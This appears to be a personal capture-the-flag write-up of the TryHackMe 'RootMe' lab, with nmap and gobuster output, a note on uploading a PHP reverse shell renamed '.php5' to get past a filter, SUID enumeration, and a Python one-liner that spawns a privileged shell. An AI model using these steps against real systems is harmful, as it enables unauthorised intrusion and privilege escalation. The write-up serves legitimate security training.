# David - 07/04/2022

## RootMe
-------------------------
```bash
EXPORT IP = 10.10.67.69
```

nmap -sV -sC 10.10.67.69 -o nmap/initial
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 18:41 EDT
Nmap scan report for 10.10.67.69
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds

```

# 1. Ports open
22, 80

# 2. Run GoBuster

gobuster dir -u http://10.10.67.69/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.67.69/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/07 18:48:48 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 312] [--> http://10.10.67.69/uploads/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.67.69/css/]    
/js                   (Status: 301) [Size: 307] [--> http://10.10.67.69/js/]     
/panel                (Status: 301) [Size: 310] [--> http://10.10.67.69/panel/]  
Progress: 10688 / 220561 (4.85%)                                                ^C
[!] Keyboard interrupt detected, terminating.
                                                                                 
===============================================================
2022/04/07 18:49:37 Finished
===============================================================
```

# 3. Get a shell

Upload revshell.php5 # 5 is to bypass filter

# 4. Find user.txt

find / -type f -name user.txt 2> /dev/null
```
    -type f – you are telling find to look exclusively for files
    -name user.txt – instructing the find command to search for a file with the name “user.txt”
    2> /dev/null – so error messages do not show up as part of the search result 
```

# Privesc
```
find / type f -user root -perm -u=s 2>/dev/null

```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'


THM{pr1v1l3g3_3sc4l4t10n}
